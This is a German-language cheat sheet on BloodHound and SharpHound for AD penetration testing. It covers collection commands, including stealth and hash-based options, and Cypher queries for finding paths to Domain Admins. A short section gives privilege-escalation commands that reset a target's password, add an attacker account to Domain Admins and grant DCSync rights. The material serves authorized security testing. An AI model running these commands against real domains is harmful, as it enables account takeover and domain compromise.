# 🩸 BloodHound – Angriffspfade in Active Directory visualisieren

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        Angriffspfade in AD visualisieren
```

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Attack_Paths-blue?style=for-the-badge" alt="Attack Paths">
  <img src="https://img.shields.io/badge/Graph_Database-green?style=for-the-badge" alt="Graph">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist BloodHound?](#-was-ist-bloodhound)
- [Installation](#-installation)
- [Daten mit SharpHound erfassen](#-daten-mit-sharphound-erfassen)
- [Die BloodHound-Oberfläche verwenden](#-die-bloodhound-oberfläche-verwenden)
- [Vordefinierte Abfragen](#-vordefinierte-abfragen)
- [Eigene Cypher-Abfragen](#-eigene-cypher-abfragen)
- [Angriffspfade analysieren](#-angriffspfade-analysieren)
- [BloodHound CE](#-bloodhound-ce)
- [Schnellübersicht](#-schnellübersicht)

---

## 🎯 Was ist BloodHound?

**BloodHound** nutzt Graphentheorie, um verborgene Angriffspfade in Active Directory sichtbar zu machen. Knoten stehen für Objekte, Kanten für deren Beziehungen. Es visualisiert:

- 🔗 **Angriffspfade** – Wege zu Domänenadministratorrechten
- 👤 **Benutzerbeziehungen** – Gruppenmitgliedschaften und Sitzungen
- 💻 **Computerbeziehungen** – Administratorrechte und Sitzungen
- 🔓 **Fehlkonfigurationen** – Ausnutzbare Berechtigungen
- 🎯 **Besonders wichtige Ziele** – Kritische Konten

### Komponenten

| Komponente | Beschreibung |
| ----------- | ------------- |
| **BloodHound** | Grafische Visualisierung auf Neo4j-Basis |
| **SharpHound** | Datensammler (.exe oder .ps1) |
| **Neo4j** | Graphdatenbank im Hintergrund |
| **BloodHound CE** | Neue Cloud-/Enterprise-Ausgabe |

---

## 🚀 Installation

### Kali Linux

```bash
# BloodHound installieren
sudo apt update
sudo apt install bloodhound

# Neo4j installieren
sudo apt install neo4j

# Neo4j starten
sudo neo4j start

# Neo4j-Browser öffnen: http://localhost:7474
# Standardzugangsdaten: neo4j / neo4j (bei der ersten Anmeldung ändern)

# BloodHound starten
bloodhound
```

### Windows

```powershell
# Von den GitHub-Releases herunterladen
https://github.com/BloodHoundAD/BloodHound/releases

# Neo4j Community Edition installieren
https://neo4j.com/download/

# Neo4j starten
# Als Administrator ausführen und den Dienst starten

# BloodHound.exe starten
```

### Docker (empfohlen)

```bash
# Neo4j mit einer für BloodHound vorgesehenen Konfiguration
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# Auf den Start warten, danach BloodHound starten
bloodhound
```

---

## 📡 Daten mit SharpHound erfassen

### SharpHound herunterladen

```bash
# Aus den BloodHound-Releases
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# Dateien:
# - SharpHound.exe (eigenständig)
# - SharpHound.ps1 (PowerShell)
```

### Grundlegende Datenerfassung

```powershell
# SharpHound ausführen (Standard – alle Erfassungsmethoden)
.\SharpHound.exe

# Domäne angeben
.\SharpHound.exe -d domain.local

# Ausgabeverzeichnis angeben
.\SharpHound.exe -o C:\Temp\

# PowerShell-Version
Import-Module .\SharpHound.ps1
Invoke-BloodHound
```

### Erfassungsmethoden

```powershell
# Alle Erfassungsmethoden
.\SharpHound.exe -c All

# Bestimmte Methoden
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Container
.\SharpHound.exe -c RDP
.\SharpHound.exe -c DCOM
.\SharpHound.exe -c PSRemote
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c LocalGroup
.\SharpHound.exe -c SPNTargets
.\SharpHound.exe -c DCOnly
```

### Erfassungsmethoden im Überblick

| Methode | Beschreibung | Auffälligkeit |
| -------- | ------------- | ------- |
| Default | Group, LocalAdmin, Session, Trusts | Gering |
| All | Alles | Hoch |
| Session | Angemeldete Benutzer | Mittel |
| LocalGroup | Mitglieder lokaler Gruppen | Mittel |
| ACL | Berechtigungen in Zugriffslisten (ACLs) | Gering |
| DCOnly | Erfassung nur vom Domänencontroller (DC) | Sehr gering |
| Group | Gruppenmitgliedschaften | Gering |
| Trusts | Vertrauensbeziehungen zwischen Domänen | Gering |

### Unauffällige Datenerfassung (Stealth)

```powershell
# Stealth-Modus (langsamer, weniger auffällig)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe --stealth

# Keine DNS-Auflösung
.\SharpHound.exe --skipdns

# Verzögerung zwischen Anfragen
.\SharpHound.exe --throttle 1000
```

### Sitzungen wiederholt erfassen

```powershell
# Sitzungen über einen Zeitraum erfassen
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# Wiederholte Erfassung mit Pausenintervall
.\SharpHound.exe -c Session --loop --loopinterval 00:05:00
```

### Unter Linux (bloodhound.py)

```bash
# Installation
pip install bloodhound

# Datenerfassung starten
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All

# Mit Hash
bloodhound-python -u user --hashes :NTLMHASH -d domain.local -c All
```

---

<a name="-die-bloodhound-oberfläche-verwenden"></a>

## 🖥️ Die BloodHound-Oberfläche verwenden

### BloodHound starten

```bash
# 1. Neo4j starten
sudo neo4j start

# 2. Auf Neo4j warten (http://localhost:7474 prüfen)

# 3. BloodHound starten
bloodhound

# 4. Anmelden
# URL: bolt://localhost:7687
# Benutzername: neo4j
# Passwort: (eigenes Passwort)
```

### Daten importieren

```
1. Auf "Upload Data" klicken (Ordnersymbol)
2. Die .zip-Datei von SharpHound auswählen
3. Warten, bis der Import abgeschlossen ist
4. Die Daten erscheinen im Graphen
```

### Oberfläche im Überblick

| Bereich | Beschreibung |
| --------- | ------------- |
| **Search** | Benutzer, Computer und Gruppen finden |
| **Analysis** | Vordefinierte Abfragen |
| **Filters** | Sichtbarkeit von Kanten und Knoten |
| **Graph** | Grafische Darstellung |
| **Node Info** | Details zum ausgewählten Element |

### Navigation

```
- Linksklick: Knoten auswählen
- Rechtsklick: Kontextmenü öffnen
- Scrollen: Vergrößern/verkleinern
- Ziehen: Ansicht verschieben
- Ctrl+Klick: Zur Auswahl hinzufügen
```

---

## 🔍 Vordefinierte Abfragen

Die folgenden Abfragenamen bleiben wie in der englischen Oberfläche erhalten.

### Domäneninformationen

```
- Find all Domain Admins
- Find all Domain Controllers
- Find high value targets
- Map Domain Trusts
```

### Kürzeste Pfade

```
- Shortest Paths to Domain Admins
- Shortest Path from Owned Principals
- Shortest Path to High Value Targets
- Shortest Path to Unconstrained Delegation
```

### Kerberos

```
- Find Kerberoastable Accounts
- Find AS-REP Roastable Users
- Shortest Path from Kerberoastable Users
- Find Principals with Unconstrained Delegation
```

### ACL-Analyse

```
- Find Principals with DCSync Rights
- Find Dangerous Rights for Domain Users
- Find Users with Foreign Domain Group Membership
```

### Computer

```
- Find Computers with Unsupported OS
- Find Computers where Domain Users are Local Admin
- Find Computers with Sessions of High Value Users
```

### GPO

```
- Find all GPO Owned by Owned Principals
- Find GPO Affecting High Value Targets
```

---

## 📝 Eigene Cypher-Abfragen

### Grundlegende Abfragen

```cypher
// Alle Benutzer finden
MATCH (u:User) RETURN u

// Alle Computer finden
MATCH (c:Computer) RETURN c

// Alle Domänenadministratoren finden
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Alle Domänencontroller finden
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

### Sitzungsabfragen

```cypher
// Computer mit Sitzungen von Domänenadministratoren finden
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// Benutzer mit Sitzungen auf mehreren Computern finden
MATCH (c:Computer)-[:HasSession]->(u:User)
WITH u, COUNT(c) as sessions
WHERE sessions > 5
RETURN u.name, sessions
ORDER BY sessions DESC
```

### Pfadabfragen

```cypher
// Kürzester Pfad zu Domänenadministratorrechten
MATCH p=shortestPath(
  (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
  -[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

// Alle Pfade zu Domänenadministratorrechten (auf 10 begrenzt)
MATCH p=(u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p LIMIT 10

// Pfade ausgehend von bereits kontrollierten Sicherheitsprinzipalen
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

### ACL-Abfragen

```cypher
// Benutzer mit DCSync-Rechten
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name

// Benutzer mit Berechtigung zum Zurücksetzen von Passwörtern
MATCH (u:User)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// Benutzer mit GenericAll auf Computerobjekten
MATCH (u:User)-[:GenericAll]->(c:Computer)
RETURN u.name, c.name
```

### Kerberos-Abfragen

```cypher
// Für Kerberoasting geeignete Benutzer mit Pfad zu Domänenadministratorrechten
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, LENGTH(p)

// Für AS-REP Roasting geeignete Benutzer
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Computer mit uneingeschränkter Delegierung
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

### Besonders wichtige Ziele

```cypher
// Besonders wichtige Ziele markieren
MATCH (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
SET u.highvalue = true

// Pfade zu besonders wichtigen Zielen finden
MATCH p=shortestPath(
  (u:User)-[*1..]->(t {highvalue:true})
)
RETURN p
```

---

## 🎯 Angriffspfade analysieren

### Angriffspfade finden

```
1. Nach dem Startknoten suchen (kompromittierter Benutzer)
2. Rechtsklick → "Mark as Owned"
3. Die Abfrage "Shortest Path from Owned Principals" ausführen
4. Die Kanten des Pfades analysieren
```

### Häufige Beziehungen im Angriffsgraphen

| Kante | Angriffsmöglichkeit |
| ------ | --------------- |
| **MemberOf** | Gruppenmitgliedschaft |
| **AdminTo** | Lokale Administratorrechte |
| **HasSession** | Zugangsdaten aus einer Sitzung gewinnen |
| **CanRDP** | RDP-Zugriff |
| **CanPSRemote** | PowerShell-Remoting |
| **ExecuteDCOM** | Ausführung über DCOM |
| **GenericAll** | Vollzugriff |
| **GenericWrite** | Objekt verändern |
| **WriteOwner** | Besitzer ändern |
| **WriteDacl** | Zugriffsliste ändern |
| **ForceChangePassword** | Passwort zurücksetzen |
| **AddMember** | Zu einer Gruppe hinzufügen |
| **AllExtendedRights** | DCSync und weitere Möglichkeiten |
| **GetChanges** | DCSync (Teil 1) |
| **GetChangesAll** | DCSync (Teil 2) |

### Beziehungen im Angriffsgraphen ausnutzen

#### GenericAll auf einem Benutzerobjekt

```powershell
# Passwort zurücksetzen
net user targetuser NewP@ssw0rd /domain

# Alternativ mit PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force)
```

#### GenericAll auf einem Computerobjekt

```powershell
# Angriff über ressourcenbasierte eingeschränkte Delegierung
# Rubeus und PowerMad verwenden
```

#### ForceChangePassword

```powershell
# Passwort zurücksetzen
net user targetuser NewP@ssw0rd /domain
```

#### AddMember

```powershell
# Benutzer zu einer Gruppe hinzufügen
net group "Domain Admins" attackeruser /add /domain

# Alternativ mit PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
```

#### WriteDacl

```powershell
# DCSync-Rechte hinzufügen
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackeruser -Rights DCSync
```

---

## 🆕 BloodHound CE

### Über BloodHound CE

**BloodHound Community Edition** ist die neue Version:
- Moderne webbasierte Oberfläche
- PostgreSQL-Backend (nicht Neo4j)
- REST-API
- Verbesserte Leistung

### Installation

```bash
# Docker Compose (empfohlen)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Aufruf: http://localhost:8080
# Standard: admin / (Docker-Protokolle prüfen)
```

### SharpHound für CE

```powershell
# CE-kompatiblen Datensammler herunterladen
# Aus den BloodHound-CE-Releases

# Datenerfassung starten (gleiche Syntax)
.\SharpHound.exe -c All
```

---

## 📊 Schnellübersicht

### SharpHound-Befehle

| Befehl | Beschreibung |
| --------- | ------------- |
| `.\SharpHound.exe` | Standarderfassung |
| `.\SharpHound.exe -c All` | Alle Methoden |
| `.\SharpHound.exe -c DCOnly` | Nur DC (unauffälligere Erfassung) |
| `.\SharpHound.exe -c Session --loop` | Wiederholte Sitzungserfassung |
| `.\SharpHound.exe -d domain.local` | Domäne angeben |
| `.\SharpHound.exe --stealth` | Stealth-Modus |

### Häufige Abfragen

| Abfrage | Zweck |
| ------- | --------- |
| Find all Domain Admins | Mitglieder der Domänenadministratoren ermitteln |
| Shortest Path to DA | Angriffspfad finden |
| Kerberoastable Users | Konten mit auswertbaren Dienstprinzipalnamen (SPNs) finden |
| AS-REP Roastable | Benutzer ohne Kerberos-Vorauthentifizierung finden |
| Unconstrained Delegation | Delegierung ausnutzen |
| DCSync Rights | Sicherheitsprinzipale mit DCSync-Rechten finden |

### Analyseablauf

```
1. Daten mit SharpHound erfassen
2. In BloodHound importieren
3. Bereits kontrollierte Sicherheitsprinzipale markieren
4. "Shortest Path from Owned" ausführen
5. Angriffskanten analysieren
6. Angriffe durchführen
7. Neu kontrollierte Sicherheitsprinzipale markieren
8. Wiederholen
```

### Wichtige Dateien

```
SharpHound-Ausgabe:
- *_BloodHound.zip (JSON-Daten)
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ous.json
- gpos.json
- containers.json
```

---

## 📚 Ressourcen

- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [BloodHound-Dokumentation](https://bloodhound.readthedocs.io/)
- [bloodhound.py](https://github.com/fox-it/BloodHound.py)

### Verwandte Cheatsheets
- [Mimikatz](../../Mimikatz/translations/README.de.md)
- [PowerShell](../../PowerShell/translations/README.de.md)
- [Windows-Rechteausweitung](../../Windows-PrivEsc/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Legacy und CE:** Die Vorlage mischt die ältere Desktop-Anwendung mit BloodHound Community Edition. CE ist weder die Bezeichnung für Enterprise noch auf einen Cloud-Dienst beschränkt. Die Aussage „nicht Neo4j“ ist zu pauschal: CE verwendet PostgreSQL für Anwendungsdaten; das Graph-Backend kann je nach Konfiguration Neo4j oder PostgreSQL sein. Der einzelne Neo4j-Container installiert noch keine vollständige CE-Umgebung. [SpecterOps: CE-Installation und Datenbanken](https://bloodhound.specterops.io/get-started/custom-installation), [SpecterOps: Einführung von CE](https://specterops.io/blog/2023/08/08/bloodhound-community-edition-a-new-era/).
- **Datensammler und Optionen:** Ohne Methodenangabe wird Default verwendet, nicht All. Die kurze Methodentabelle ist keine vollständige Definition. Die aktuelle Dokumentation nennt OutputDirectory; die gezeigten Kurzoptionen und skipdns sind nicht allgemein auf jede Version übertragbar. Der Collector muss zur BloodHound-Instanz passen. Auch BloodHound.py unterscheidet Legacy- und CE-Fassungen. DCOnly und Stealth verändern Umfang und Kontaktmuster, garantieren aber keine unsichtbare Erfassung. [SharpHound: Methoden und Optionen](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags), [SharpHound: Versionskompatibilität](https://github.com/SpecterOps/SharpHound), [BloodHound.py: unterstützte Fassungen](https://github.com/dirkjanm/BloodHound.py).
- **Abfragen und Schema:** Die Cypher-Beispiele setzen passende Namen, Eigenschaften, Kanten und Erfassungsdaten voraus. Unbeschränkte Beziehungsmuster bilden nicht automatisch ausschließlich praktisch ausnutzbare Angriffspfade ab. owned und highvalue sind versionsabhängige Schemaannahmen. SET verändert Daten; seine Verfügbarkeit hängt von Backend und Konfiguration ab und ist keine gewöhnliche reine Suchabfrage. Die ursprünglichen Abfragen bleiben unverändert. [SpecterOps: unterstützte Cypher-Syntax](https://bloodhound.specterops.io/analyze-data/explore/cypher-supported), [SpecterOps: Cypher-Suche](https://bloodhound.specterops.io/analyze-data/explore/cypher-search).
- **Befunde und Rechte:** Eine HasSession-Kante ist eine zeitgebundene Beobachtung und garantiert keine verfügbaren Zugangsdaten. Ebenso müssen Rechte, effektive Gruppenmitgliedschaften und weitere Voraussetzungen zur konkreten Aktion passen; ein angezeigter Pfad allein bestätigt keine erfolgreiche Domänenübernahme. [SpecterOps: HasSession und Ergebnisgrenzen](https://bloodhound.specterops.io/resources/edges/has-session).
- **Oberfläche und Dateien:** Menüpfade, vorgefertigte Abfragen, Anmeldung und Ausgabedateien sind versionsabhängig. Aktuelle CE-Daten werden über die Weboberfläche verarbeitet; ein Legacy-Bolt-Login ist kein allgemeiner CE-Login. Die Dateiübersicht ist schematisch: Erfassungsmethoden und Ausgabeoptionen bestimmen Inhalt und Namen. Die ursprünglichen Befehle und Beispielwerte bleiben erhalten. [SpecterOps: aktuelle Suche](https://bloodhound.specterops.io/analyze-data/explore/cypher-search), [SharpHound: Ausgabeoptionen](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags).

---

<p align="center">
  <b>🩸 Den Weg zu Domänenadministratorrechten finden!</b><br>
  <i>BloodHound – ein Begleiter für AD-Penetrationstests</i>
</p>
